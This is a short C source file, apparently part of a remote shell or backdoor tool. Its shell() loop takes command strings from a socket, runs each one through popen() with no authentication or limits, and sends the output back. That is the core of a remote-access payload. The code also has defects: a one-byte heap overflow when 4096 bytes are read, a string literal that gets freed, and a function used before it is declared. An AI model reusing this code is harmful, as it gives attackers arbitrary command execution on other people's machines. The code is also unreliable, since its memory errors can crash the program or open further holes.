#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include "send_receive.h"

void shell(int sockfd);

void shell(int sockfd){
    bool loop = true;
    while (loop == true){
        char * recv_command = recv_messsage(sockfd);
        char * command_result = command(recv_command);
        if(strcmp(recv_command, "exit") == 0){
            loop = false;
        }
        free(recv_command);
        send_message(sockfd, command_result); 
        free(command_result);
    }
    return;
}

char* command(char * command){
    FILE *command_pipe = popen(command, "r");
    char* buffer = (char*)malloc(4096);
    if (command_pipe != NULL){
        size_t bytes_read = fread(buffer, 1, 4096, command_pipe);
        buffer[bytes_read] = '\0';
        if (bytes_read == 0){
            buffer[0] = '\0';
        }
        pclose(command_pipe);
        return buffer;
    }
    else{
        return "Error";
    }
}